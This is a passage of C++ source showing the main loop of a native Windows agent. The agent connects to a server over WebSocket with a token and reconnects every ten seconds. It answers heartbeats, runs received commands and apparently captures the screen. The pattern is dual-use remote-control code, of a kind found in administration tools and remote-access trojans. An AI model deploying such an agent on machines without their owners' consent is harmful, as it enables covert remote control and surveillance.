        else if (arg == "--token" && i + 1 < argc) token = argv[++i];
        else if (arg == "--agentid" && i + 1 < argc) agentId = argv[++i];
    }
    if (agentId.empty()) agentId = AgentIdentity();

    while (true) {
        WebSocketClient client;
        if (!client.Connect(server, agentId, token)) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
            continue;
        }
        if (!Handshake(client, agentId, token)) {
            client.Close();
            std::this_thread::sleep_for(std::chrono::seconds(10));
            continue;
        }
        std::cout << "[native] connected as " << agentId << std::endl;
        g_client = &client;
        while (true) {
            std::vector<uint8_t> data;
            if (!client.Receive(data)) break;
            Frame frame;
            if (!ParseFrame(data, frame)) continue;
            try {
                if (frame.type == 10) {
                    SendJson(client, 11, json{{"timestamp", (long long)std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count()}});
                } else if (frame.type == 20) {
                    json command = json::parse(frame.payload);
                    json result = HandleCommand(command, agentId);
                    SendJson(client, 22, result);
                }
            } catch (...) { }
        }
        StopScreen();
        g_client = nullptr;
        client.Close();
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return 0;
}
